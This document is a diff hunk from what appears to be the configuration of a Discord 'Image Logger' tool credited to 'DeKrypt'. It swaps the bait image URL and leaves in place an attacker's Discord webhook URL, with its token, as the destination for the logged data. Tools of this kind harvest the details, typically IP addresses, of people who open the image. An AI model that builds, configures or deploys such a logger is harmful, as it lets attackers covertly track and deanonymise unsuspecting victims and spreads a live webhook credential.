@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1383455667020365824/rkwzgKb5_d82d5IZWifiqYF-Nw9a10XL96u3vb8o8eOR9T-H_xarqQf2fMXhyQ45USnP",
-    "image": "https://cdn.discordapp.com/attachments/1088454850892804160/1380521564230909992/image.png?ex=684eba65&is=684d68e5&hm=6b63a9db8a6b7866de23ca5344a9d8862aaa4b101231d3e714eaa6f728a6eb0c&",
+    "image": "https://cdn.discordapp.com/attachments/1088454850892804160/1380521564411396216/image.png?ex=684eba65&is=684d68e5&hm=2d932a8f7427d6a56b1a15d8de33968f0241d201ffafc9708507107f7722a15a&",
     "imageArgument": True,
 
     "username": "Image Logger",
